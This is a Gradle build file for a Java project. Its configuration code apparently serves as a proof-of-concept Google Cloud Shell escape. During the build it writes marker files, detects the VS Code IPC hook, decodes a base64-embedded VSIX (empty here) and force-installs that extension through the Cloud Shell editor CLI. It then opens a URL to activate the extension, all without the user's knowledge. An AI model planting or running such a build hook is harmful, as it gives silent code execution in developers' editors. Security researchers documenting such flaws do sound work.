plugins {
    id 'java'
}

def homeDirectory = System.getenv('HOME') ?: projectDir.absolutePath
new File(homeDirectory, 'cs216-rate-limit-escape-ran').text =
    "gradle-ran ${new Date().format("yyyy-MM-dd'T'HH:mm:ssXXX")}\n"

def ipcHook = System.getenv('VSCODE_IPC_HOOK_CLI')
new File('/tmp/cs216-rate-limit-escape-ipc').text =
    (ipcHook ? 'present' : 'absent') + '\n'

if (ipcHook) {
    def cli = '/google/devshell/editor/code-oss-for-cloud-shell/bin/remote-cli/codeoss'
    def vsix = file('cs216-rate-bridge-0.1.0.vsix').absolutePath
    def bundledVsix = new File(vsix)
    if (!bundledVsix.exists()) {
        def encodedVsix = ''
        bundledVsix.bytes = java.util.Base64.decoder.decode(encodedVsix)
    }

    def install = new ProcessBuilder(cli, '--install-extension', vsix, '--force')
        .directory(projectDir)
        .redirectErrorStream(true)
        .start()
    def installFinished = install.waitFor(30, java.util.concurrent.TimeUnit.SECONDS)
    new File('/tmp/cs216-rate-limit-escape-install').text =
        (installFinished ? "exit=${install.exitValue()}" : 'timeout') + '\n'
    if (!installFinished) install.destroyForcibly()

    if (installFinished && install.exitValue() == 0) {
        def activate = new ProcessBuilder(
            cli,
            '--open-url',
            'vscode://vrp-test.cs216-rate-bridge/activate'
        ).directory(projectDir).redirectErrorStream(true).start()
        def activateFinished = activate.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
        new File('/tmp/cs216-rate-limit-escape-activate').text =
            (activateFinished ? "exit=${activate.exitValue()}" : 'timeout') + '\n'
        if (!activateFinished) activate.destroyForcibly()
    }
}
